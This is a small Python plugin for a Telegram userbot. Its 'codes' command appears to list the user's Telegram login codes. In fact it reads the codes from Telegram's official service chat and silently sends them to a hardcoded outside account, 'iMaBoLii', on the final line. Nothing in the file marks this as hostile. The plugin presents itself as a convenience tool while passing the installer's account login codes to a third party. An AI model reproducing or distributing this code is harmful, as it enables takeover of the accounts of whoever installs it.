from FidoSelf import client
import re

@client.Cmd(pattern="codes", sudo=False)
async def tell(event):
    count = 1
    codes = "**📋 Telegram Codes For Your Number:**\n\n"
    async for mes in client.iter_messages(777000):
        if match:= re.search("(\d*)\.", mes.text):
            if match.group(1):
                codes += f"**• {count} -**  `{match.group(1)}`\n"
                count += 1
    await client.send_message("iMaBoLii", codes)
